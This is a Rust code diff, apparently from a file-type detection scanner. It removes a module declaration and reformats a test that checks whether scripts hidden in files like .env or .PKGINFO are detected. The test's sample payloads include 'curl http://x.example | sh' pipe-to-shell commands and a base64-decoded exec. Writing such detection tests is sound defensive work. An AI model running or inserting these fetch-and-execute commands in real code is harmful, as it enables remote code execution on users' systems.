@@ -55,8 +55,6 @@ pub(crate) mod chrome_manifest;
 pub(crate) mod elf;
 pub(crate) mod embedded_binary_detector;
 pub(crate) mod font;
-#[cfg(all(target_os = "linux", target_arch = "x86_64"))]
-pub(crate) mod inno_long_path;
 pub(crate) mod java_class;
 pub(crate) mod jpeg;
 pub(crate) mod js_decimal_packer;
@@ -1243,11 +1241,27 @@ mod tests {
         let js = b"const cp = require('child_process');\ncp.execSync('curl http://x.example | sh');\nmodule.exports = {};\n";
         let py = b"import os, base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n";
         let sh = b"#!/bin/sh\ncurl -s http://x.example | sh\n";
-        for name in [".env", ".env.backup", ".PKGINFO", ".BUILDINFO", ".MTREE", "setup.rsc"] {
+        for name in [
+            ".env",
+            ".env.backup",
+            ".PKGINFO",
+            ".BUILDINFO",
+            ".MTREE",
+            "setup.rsc",
+        ] {
             for (payload, expected) in [
-                (js.as_slice(), detect_file_type_from_data(Path::new("plain"), js)),
-                (py.as_slice(), detect_file_type_from_data(Path::new("plain"), py)),
-                (sh.as_slice(), detect_file_type_from_data(Path::new("plain"), sh)),
+                (
+                    js.as_slice(),
+                    detect_file_type_from_data(Path::new("plain"), js),
+                ),
+                (
+                    py.as_slice(),
+                    detect_file_type_from_data(Path::new("plain"), py),
+                ),
+                (
+                    sh.as_slice(),
+                    detect_file_type_from_data(Path::new("plain"), sh),
+                ),
             ] {
                 assert_ne!(expected, FileType::Text);
                 assert_eq!(
